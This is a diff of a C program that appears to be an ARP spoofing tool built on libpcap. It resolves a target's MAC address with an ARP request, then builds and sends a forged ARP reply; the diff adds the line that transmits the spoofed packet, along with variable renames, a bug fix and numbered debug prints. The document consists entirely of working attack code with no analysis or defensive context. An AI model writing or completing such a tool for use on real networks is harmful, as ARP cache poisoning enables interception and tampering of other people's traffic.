@@ -79,29 +79,30 @@ int main(int argc, char *argv[]){
 	printf("My MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);
 	
 	//Saving my ip address	
-	struct sockaddr_in* my_ip;
+	struct sockaddr_in* sin;
 	char size_ip;
 	if(ioctl(s, SIOCGIFADDR, &ifr)<0){
 		printf("IP fail\n");
 		return -1;
 	}
-	my_ip=(struct sockaddr_in*)&ifr.ifr_addr;
-	printf("MY IP: %s\n", inet_ntoa(my_ip->sin_addr));
-	inet_ntop(AF_INET,&my_ip->sin_addr,s_ip,sizeof(s_ip));
+	sin=(struct sockaddr_in*)&ifr.ifr_addr;
+	printf("MY IP: %s\n", inet_ntop(AF_INET,&sin->sin_addr,s_ip,sizeof(s_ip)));
 	
+	printf("0\n");
 	//Making sender arp
 	memset(target_mac, 0, sizeof(uint8_t)*6);
 	make_arp(arp_rq, my_mac, target_mac, 1);
 	inet_pton(AF_INET, s_ip, arp_rq->sender_ip);
 	inet_pton(AF_INET, argv[2], arp_rq->target_ip);
-	
+	printf("1\n");
 	//Making ethernet
+	struct ether s_ethpkt;
 	size=sizeof(struct ether)+sizeof(struct arp);
 	memset(target_mac, 255, sizeof(uint8_t)*6);
-	make_ether(ether_sender, target_mac, my_mac, *arp_rq);
-	uint8_t* packet_rq=(uint8_t*)malloc(size*sizeof(uint8_t));
-	memcpy(packet_rq, ether_sender, size*sizeof(uint8_t));
-		
+	make_ether(&s_ethpkt, target_mac, my_mac, *arp_rq);
+	uint8_t* s_pkt=(uint8_t*)malloc(size*sizeof(uint8_t));
+	memcpy(s_pkt, &s_ethpkt, size*sizeof(uint8_t));
+	printf("2\n");
 	//Sending packet
 	
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -110,29 +111,34 @@ int main(int argc, char *argv[]){
 		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
 		return -1;
 	}
-	if(pcap_sendpacket(handle, packet_rq, size)){
+	if(pcap_sendpacket(handle, s_pkt, size)){
 		printf("Sending packet fail");
 		return -1;
-	}
-
+	}	
+	printf("3\n");
 
 	while(1){
-		const uint8_t* packet_rp;
+		const uint8_t* packet_r;
 		struct pcap_pkthdr* header;
-		struct ether* ether_reply;
-		struct arp* arp_target;
-		int res = pcap_next_ex(handle, &header, &packet_rp);
-		if(res==0); continue;
+		struct ether* ether_r;
+		printf("5\n");
+		int res = pcap_next_ex(handle, &header, &packet_r);
+		printf("6\n");
+		if(res==0) continue;
+		printf("7\n");
 		if(res==-1 || res==-2) break;
-
-		ether_reply=(struct ether*)(packet_rp);
-		if(arp_target!=NULL&&ntohs(ether_reply->ether_type)==0x0806){
-			memcpy(target_mac, ether_reply->ether_shost, sizeof(uint8_t)*6);
+		printf("4\n");
+		ether_r=(struct ether*)(packet_r);
+		if(ether_r!=NULL&&ntohs(ether_r->ether_type)==0x0806){
+			memcpy(target_mac, ether_r->ether_shost, sizeof(uint8_t)*6);
+			printf("8\n");
 			printf("TARGET MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
 			break;
 		}
-		else
+		else{
+			printf("9\n");
 			continue;
+		}
 	}
 	
 	make_arp(arp_rp, my_mac, target_mac,2);
@@ -142,6 +148,10 @@ int main(int argc, char *argv[]){
 	make_ether(&spoof_ether, target_mac, my_mac, *arp_rp);
 	uint8_t* spoof_packet=(uint8_t*)malloc(size*sizeof(uint8_t));
 	memcpy(spoof_packet, &spoof_ether, size*sizeof(uint8_t)); 
+	if(pcap_sendpacket(handle, spoof_packet, size)){
+		printf("Sending packet fail\n");
+		return -1;
+	}
 	free(arp_rq);
 	free(arp_rp);
 }
